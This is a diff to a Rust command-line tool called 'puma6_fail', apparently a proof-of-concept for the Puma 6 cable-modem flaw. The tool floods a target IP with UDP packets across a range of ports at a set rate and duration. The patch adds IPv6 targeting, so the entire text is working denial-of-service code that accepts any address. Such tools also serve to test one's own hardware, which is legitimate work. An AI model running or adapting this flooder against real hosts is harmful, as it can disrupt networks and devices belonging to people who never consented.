@@ -10,6 +10,8 @@ use std::net::UdpSocket;
 use std::thread;
 use std::time::Duration;
 
+use std::net::{Ipv4Addr, SocketAddrV4, Ipv6Addr, SocketAddrV6, SocketAddr};
+
 fn main() {
 	let args: Vec<_> = env::args().collect();
 	let mut target = "0.0.0.0";
@@ -17,6 +19,9 @@ fn main() {
 	let mut mbper_second = 1f32;
 	let mut port_range = 50000;
 	let mut run_seconds = -1;
+	let mut ipv4 = Ipv4Addr::new(0, 0, 0, 0);
+	let mut ipv6 = Ipv6Addr::new(0, 0, 0, 0, 0, 0, 0, 0);
+	let mut is_ipv6 = false;
 
 	println!("usage: ./puma6_fail <target ip={}> <payload length={}> <mbps={}> <ports={}> <run seconds={}>", target, length, mbper_second, port_range, run_seconds);
 
@@ -25,7 +30,17 @@ fn main() {
 		return;
 	}
 
+	// parse target IP
 	target = args[1].as_str();
+	let parse_ipv4 = target.parse::<Ipv4Addr>();
+	if parse_ipv4.is_err() {
+		// probably IPv6
+		ipv6 = target.parse::<Ipv6Addr>().expect("invalid IP");
+		is_ipv6 = true;
+	} else {
+		ipv4 = parse_ipv4.unwrap();
+	}
+
 	if args.len() > 2 {
 		length = args[2].as_str().parse::<usize>().expect("invalid packet size")
 	}
@@ -42,7 +57,14 @@ fn main() {
 		run_seconds = args[5].as_str().parse::<i32>().expect("invalid run seconds");
 	}
 
-	let source = UdpSocket::bind("0.0.0.0:10000").expect("couldn't bind to address");;
+	let socket_addr;
+	if is_ipv6 {
+		socket_addr = SocketAddr::V6(SocketAddrV6::new(Ipv6Addr::new(0, 0, 0, 0, 0, 0, 0, 0), 10000, 0, 0));
+	} else {
+		socket_addr = SocketAddr::V4(SocketAddrV4::new(Ipv4Addr::new(0, 0, 0, 0), 10000));
+	}
+
+	let source = UdpSocket::bind(socket_addr).expect("couldn't bind to address");;
 	let data = vec![0; length as usize];
 	let per_second = (1024f32 * 1024f32 * mbper_second) / 8f32;
 	let udp_length = length + 28;
@@ -56,7 +78,12 @@ fn main() {
 	let mut count = 0;
 	loop {
 		for port in 10000..(10000 + port_range) {
-			let result = source.send_to(&data, format!("{}:{}", target, port));
+			let result;
+			if is_ipv6 {
+				result = source.send_to(&data, SocketAddr::V6(SocketAddrV6::new(ipv6, port, 0, 0)));
+			} else {
+				result = source.send_to(&data, SocketAddr::V4(SocketAddrV4::new(ipv4, port)));
+			}
 			if result.is_err() {
 				println!("Failed to send packet. {}", result.unwrap_err());
 			}
